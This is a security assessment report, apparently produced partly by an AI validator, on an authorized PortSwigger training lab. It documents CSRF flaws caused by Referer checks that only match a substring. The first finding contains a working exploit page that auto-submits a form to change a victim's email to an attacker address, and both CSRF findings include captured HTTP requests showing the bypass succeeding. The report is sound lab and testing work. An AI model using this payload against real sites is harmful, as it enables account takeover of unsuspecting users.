# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — csrf CSRF with broken Referer validation on change-email enables victim account/email takeover](#finding-1)
    - [2. LOW — csrf Login CSRF: Referer-based CSRF protection bypassable via substring match](#finding-2)
    - [3. LOW — burp Strict transport security not enforced (3 URLs)](#finding-3)
    - [4. INFO — burp TLS certificate](#finding-4)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr6pdk1h-cqg1js` |
| Target | https://0a460024044074f283fb32c700b20073.web-security-academy.net/ |
| Started | 2026-07-04T18:35:53.442Z |
| Generated | 2026-07-04T19:35:59.610Z |
| Phase | report |
| Screens | 3 mapped · 3 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 4 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `*.web-security-academy.net`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

4 finding(s): 1 medium, 2 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [csrf] CSRF with broken Referer validation on change-email enables victim account/email takeover

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a460024044074f283fb32c700b20073.web-security-academy.net/

POST /my-account/change-email changes the logged-in user's email with NO anti-CSRF token (the form/request carries only an `email` field). The endpoint tries to defend with Referer validation, but the check is BROKEN: it only requires that the lab/application domain appears as a SUBSTRING anywhere in the Referer, rather than validating the Referer's origin. The session cookie is `SameSite=None`, so it is sent on cross-site requests, making this remotely exploitable from the exploit server.

Distinguishable evidence (valid wiener session cookie on all three):
- NEGATIVE CONTROL ev-mr6r2tqz-2h: plain cross-site Referer (https://exploit-<id>.exploit-server.net/) => HTTP 400 "Invalid referer header" (REJECTED).
- POSITIVE REPLAY 1 ev-mr6r2y09-2i: cross-site Referer with lab domain in query string (…exploit-server.net/?0a460024044074f283fb32c700b20073.web-security-academy.net) => HTTP 302 -> /my-account, email changed to pwned-csrf-1@attacker.net (ACCEPTED).
- POSITIVE REPLAY 2 ev-mr6r32a0-2j: same bypass, different path+email => HTTP 302 -> /my-account, email changed to pwned-csrf-2@attacker.net (ACCEPTED, stable).
Supporting: a missing Referer also => 400 (ev-mr6qxzgj-28), ruling out the "Referer-must-be-present" variant; probe_scenario differential also confirmed marker present only under the bypass (ev-mr6r0xe0-2c / ev-mr6r15yd-2e / ev-mr6r1eiw-2g).

Impact: an attacker page on the exploit server silently changes a logged-in victim's account email; controlling the victim's email enables a password reset and full account takeover. Satisfies the lab PRIMARY objective (use the exploit server to change the victim's email).

**Reproduction**

```
Authenticated confirmation (as wiener:peter):
1. POST /my-account/change-email, Referer: https://exploit-<id>.exploit-server.net/, body email=x@evil.net => 400 "Invalid referer header".
2. POST /my-account/change-email, Referer: https://exploit-<id>.exploit-server.net/?0a460024044074f283fb32c700b20073.web-security-academy.net, body email=x@evil.net => 302, email changed. (Only difference is the lab domain appearing in the Referer => broken substring validation.)

Weaponized exploit-server payload (set response header `Referrer-Policy: unsafe-url` so the full URL incl. query string is sent as Referer):

<html>
  <body>
    <form action="https://0a460024044074f283fb32c700b20073.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.net">
    </form>
    <script>
      history.pushState("", "", "/?0a460024044074f283fb32c700b20073.web-security-academy.net");
      document.forms[0].submit();
    </script>
  </body>
</html>

history.pushState() rewrites the exploit page URL to embed the lab domain in its query string; Referrer-Policy: unsafe-url makes the browser transmit that full URL as the Referer cross-origin, satisfying the broken substring check. A logged-in victim who loads the page has their email silently changed.

Fix: use a per-session unpredictable anti-CSRF token validated server-side; do not rely on Referer. If Referer is validated, match the full origin (not a substring) and set the session cookie SameSite=Lax/Strict.
```

**Evidence**

- Evidence `ev-mr6r2tqz-2h` — `artifacts/_/ev-mr6r2tqz-2h/`

Request:

```http
POST /my-account/change-email HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
cookie: <redacted>
referer: https://exploit-0a590088045474f5834f314601e000af.exploit-server.net/

email=control-plain-crosssite%40evil.net
```

Response:

```http
HTTP/1.1 400
content-length: 24
content-type: application/json; charset=utf-8
x-frame-options: SAMEORIGIN

"Invalid referer header"
```

- Evidence `ev-mr6r2y09-2i` — `artifacts/_/ev-mr6r2y09-2i/`

Request:

```http
POST /my-account/change-email HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
cookie: <redacted>
referer: https://exploit-0a590088045474f5834f314601e000af.exploit-server.net/?0a460024044074f283fb32c700b20073.web-security-academy.net

email=pwned-csrf-1%40attacker.net
```

Response:

```http
HTTP/1.1 302
content-length: 0
location: /my-account?id=wiener
x-frame-options: SAMEORIGIN
```

- Evidence `ev-mr6r32a0-2j` — `artifacts/_/ev-mr6r32a0-2j/`

Request:

```http
POST /my-account/change-email HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
cookie: <redacted>
referer: https://exploit-0a590088045474f5834f314601e000af.exploit-server.net/blog?0a460024044074f283fb32c700b20073.web-security-academy.net

email=pwned-csrf-2%40attacker.net
```

Response:

```http
HTTP/1.1 302
content-length: 0
location: /my-account?id=wiener
x-frame-options: SAMEORIGIN
```

<a id="finding-2"></a>

### 2. [LOW] [csrf] Login CSRF: Referer-based CSRF protection bypassable via substring match

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0a460024044074f283fb32c700b20073.web-security-academy.net/

POST /login carries no anti-CSRF token (the form has only username + password). Its sole CSRF defense is validating the Referer header, but the check is a naive substring match for the application's domain rather than a real origin check. Evidence: (1) a request with an off-domain Referer that does NOT contain the target domain — Referer: https://evil-attacker.com/nomatch — is rejected with 400 "Invalid referer header" (ev-mr6q636z-u, 24-byte body). (2) A request from the same off-domain origin whose URL merely INCLUDES the target domain as a substring — Referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net — passes validation and the login is processed (200, 4247-byte login page), reproduced twice (ev-mr6q2jy8-h, ev-mr6q67h0-v). Because the session cookie is SameSite=None (sendable/settable cross-site, per analyze_session), an attacker can host a page whose URL embeds the target domain and which sets Referrer-Policy: unsafe-url (so the full URL — including the domain substring — is sent as the cross-origin Referer), auto-submitting a POST /login with attacker-controlled credentials. A victim who visits is silently authenticated as the attacker (login CSRF); the victim's subsequent activity is then recorded under the attacker's account.

**Reproduction**

```
1. NEGATIVE CONTROL: POST /login, body username=wiener&password=x, header Referer: https://evil-attacker.com/nomatch  ->  400 "Invalid referer header" (ev-mr6q636z-u). Also no-Referer at all -> same 400 (ev-mr6pyyaw-6).
2. BYPASS / POSITIVE x2: POST /login, same body, header Referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net  ->  200, login processed (ev-mr6q2jy8-h, ev-mr6q67h0-v). Only difference vs the control is that the off-domain Referer now contains the target domain as a substring.
3. Confirm session cookie is SameSite=None (analyze_session) -> cross-site sendable.
4. Weaponize: attacker page at https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net with <meta name="referrer" content="unsafe-url"> and a form that auto-POSTs /login with attacker credentials. Victim's browser sends the full URL as Referer (passes the substring check), and is logged into the attacker's account.
```

**Evidence**

- Evidence `ev-mr6q636z-u` — `artifacts/s-0002/ev-mr6q636z-u/`

Request:

```http
POST /login HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
referer: https://evil-attacker.com/nomatch

username=wiener&password=x
```

Response:

```http
HTTP/1.1 400
content-length: 24
content-type: application/json; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

"Invalid referer header"
```

- Evidence `ev-mr6q2jy8-h` — `artifacts/s-0002/ev-mr6q2jy8-h/`

Request:

```http
POST /login HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net

username=wiener&password=x
```

Response:

```http
HTTP/1.1 200
content-length: 4247
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a590088045474f5834f314601e000af.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VXNlIHRoZSBleHBsb2l0IHNlcnZlciB0byBkZWxpdmVyIGFuIGF0dGFjayB0aGF0IGNoYW5nZXMgdGhlIHZpY3RpbSB1c2VyJ3MgZW1haWwgYWRkcmVzcy4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2NzcmYvYnlwYXNzaW5nLXJlZmVyZXItYmFzZWQtZGVmZW5zZXMvbGFiLXJlZmVyZXItdmFsaWRhdGlvbi1icm9rZW4='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username or password.</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr6q67h0-v` — `artifacts/s-0002/ev-mr6q67h0-v/`

Request:

```http
POST /login HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
user-agent: verdict-scanner/0.1
x-verdict: assessment
content-type: application/x-www-form-urlencoded
referer: https://evil-attacker.com/?0a460024044074f283fb32c700b20073.web-security-academy.net

username=wiener&password=x
```

Response:

```http
HTTP/1.1 200
content-length: 4247
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a590088045474f5834f314601e000af.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VXNlIHRoZSBleHBsb2l0IHNlcnZlciB0byBkZWxpdmVyIGFuIGF0dGFjayB0aGF0IGNoYW5nZXMgdGhlIHZpY3RpbSB1c2VyJ3MgZW1haWwgYWRkcmVzcy4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2NzcmYvYnlwYXNzaW5nLXJlZmVyZXItYmFzZWQtZGVmZW5zZXMvbGFiLXJlZmVyZXItdmFsaWRhdGlvbi1icm9rZW4='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <p class=is-warning>Invalid username or password.</p>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-3"></a>

### 3. [LOW] [burp] Strict transport security not enforced (3 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) [+2 more URL(s): https://0a460024044074f283fb32c700b20073.web-security-academy.net/post, https://0a460024044074f283fb32c700b20073.web-security-academy.net/post/comment] @ https://0a460024044074f283fb32c700b20073.web-security-academy.net/login

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6rifqv-2v` — `artifacts/_/ev-mr6rifqv-2v/`

Request:

```http
GET /login HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net

GET /login HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 4169

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0a590088045474f5834f314601e000af.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VXNlIHRoZSBleHBsb2l0IHNlcnZlciB0byBkZWxpdmVyIGFuIGF0dGFjayB0aGF0IGNoYW5nZXMgdGhlIHZpY3RpbSB1c2VyJ3MgZW1haWwgYWRkcmVzcy4=' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L2NzcmYvYnlwYXNzaW5nLXJlZmVyZXItYmFzZWQtZGVmZW5zZXMvbGFiLXJlZmVyZXItdmFsaWRhdGlvbi1icm9rZW4='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>Login</h1>
                    <section>
                        <form class=login-form method=POST action="/login">
                            <label>Username</label>
                            <input required type=username name="username" autofocus>
                            <label>Password</label>
                            <input required type=password name="password">
                            <button class=button type=submit> Log in </button>
                        </form>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-4"></a>

### 4. [INFO] [burp] TLS certificate

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Amazon RSA 2048 M01</td></tr><tr><td><b>Valid from:</b>&nbsp;&nb @ https://0a460024044074f283fb32c700b20073.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr6rifql-2u` — `artifacts/_/ev-mr6rifql-2u/`

Request:

```http
GET / HTTP/1.1
Host: 0a460024044074f283fb32c700b20073.web-security-academy.net
```

Response:

```http
HTTP/1.1 0
```
